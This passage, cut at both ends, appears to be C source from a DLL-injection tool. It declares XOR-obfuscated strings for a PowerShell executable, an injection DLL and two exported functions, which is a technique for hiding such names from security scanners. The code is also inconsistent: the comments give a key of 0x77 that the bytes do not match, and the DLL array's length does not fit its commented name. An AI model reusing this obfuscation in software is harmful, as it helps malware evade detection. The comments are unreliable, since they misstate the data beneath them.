...
static const unsigned char xPowerShell[] = {
    0xA2, 0xBD, 0xA5, 0xB7, 0xA0, 0xA1, 0xBA, 0xB7,
    0xBE, 0xBE, 0xFC, 0xB7, 0xAA, 0xB7
};
#define xPowerShell_LEN 14

/* "cheyanne_inject.dll" XOR 0x77 */
static const unsigned char xDllName[] = {
    0xA4, 0xB3, 0xB6, 0xB7, 0xA0, 0x8D, 0xBB, 0xBC,
    0xB8, 0xB7, 0xB1, 0xA6, 0xFC, 0xB6, 0xBE, 0xBE
};
#define xDllName_LEN 16

/* "VdrInit" XOR 0x77 */
static const unsigned char xInitFunc[] = {
    0x84, 0xB6, 0xA0, 0x9B, 0xBC, 0xBB, 0xA6
};
#define xInitFunc_LEN 7

/* "VdrWatch" XOR 0x77 */
static const unsigned char xWatchFunc[] = {
    0x84, 0xB6, 0xA0, 0x85, 0xB3, 0xA6, 0xB1, 0xBA
};
